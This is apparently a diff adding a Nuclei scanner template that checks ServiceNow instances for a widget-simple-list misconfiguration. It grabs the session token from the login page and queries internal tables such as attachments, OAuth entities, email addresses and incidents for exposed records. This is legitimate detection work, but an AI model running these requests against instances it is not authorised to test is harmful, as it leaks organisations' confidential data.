@@ -1,0 +1,88 @@
+id: servicenow-widget-misconfig
+
+info:
+  name: ServiceNow Widget-Simple-List - Misconfiguration
+  author: DhiyaneshDk
+  severity: unknown
+  reference:
+    - https://github.com/bsysop/servicenow
+    - https://twitter.com/ConspiracyProof/status/1713270026046685272
+    - https://www.enumerated.ie/servicenow-data-exposure
+  classification:
+    cpe: cpe:2.3:a:servicenow:servicenow:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 54
+    vendor: servicenow
+    product: servicenow
+    shodan-query: title:"servicenow"
+  tags: servicenow,widget,misconfig
+
+http:
+  - raw:
+      - |
+        @once
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        @once
+        GET /login.do HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /api/now/sp/widget/widget-simple-list?{{table_list}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        X-UserToken: {{user-token}}
+        Content-Type: application/json
+
+        {}
+
+    payloads:
+      table_list:
+        - t=kb_knowledge&f=text
+        - t=cmdb_model&f=name
+        - t=cmn_department&f=app_name
+        - t=licensable_app&f=app_name
+        - t=alm_asset&f=display_name
+        - t=sys_attachment&f=file_name
+        - t=sys_attachment_doc&f=data
+        - t=oauth_entity&f=name
+        - t=cmn_cost_center&f=name
+        - t=cmdb_model&f=name
+        - t=sc_cat_item&f=name
+        - t=sn_admin_center_application&f-name
+        - t=cmn_company&f=name
+        - t=sys_email_attachment&f=email
+        - t=sys_email_attachment&f=attachment
+        - t=cmn_notif_device&f=email_address
+        - t=sys_portal_age&f=display_name
+        - t=incident&f=short_description
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"isValid":true'
+          - '"count":'
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          - '"display_value":"(.*)",'
+
+    extractors:
+      - type: regex
+        name: user-token
+        group: 1
+        regex:
+          - var g_ck = '([0-9a-z]+)'
+        internal: true
+
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '"count":([0-9]+),'
+# digest: 4b0a00483046022100813962420e9db04b21e04a0bd2af21fc3d488b034c56965ae8c21421e4e8f6d5022100bfe2b94d036c4d242e4c0b69fd28c981def8deb33ebf4bdc37ff685708ea0130:922c64590222798bb761d5b6d8e72950
